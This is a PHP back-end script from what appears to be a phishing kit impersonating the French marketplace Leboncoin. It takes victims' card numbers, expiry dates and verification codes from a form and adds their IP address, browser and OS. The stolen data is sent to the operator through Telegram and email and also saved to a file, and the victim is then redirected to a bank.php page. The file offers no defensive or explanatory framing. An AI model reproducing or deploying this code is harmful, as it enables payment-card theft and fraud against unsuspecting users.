<?php
error_reporting(0);
if(isset($_POST['cardType']) ){
include "../config.php";
include "inc/funcs.php";




$subject = "[Leboncoin] [CC] INFO from $ip";

$info1 = $_POST['cardType'];
$info2 = $_POST['cardNumber'];
$info3 = $_POST['expDate'];
$info4 = $_POST['verificationCode'];




$message = "cardType: $info1\ncardNumber: $info2\nexpDate: $info3\nverificationCode: $info4\nOS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../bank.php\" />";
}
else{

	echo "<meta http-equiv=\"Refresh\" content=\"0; url=../card.php\" />";
}
?>
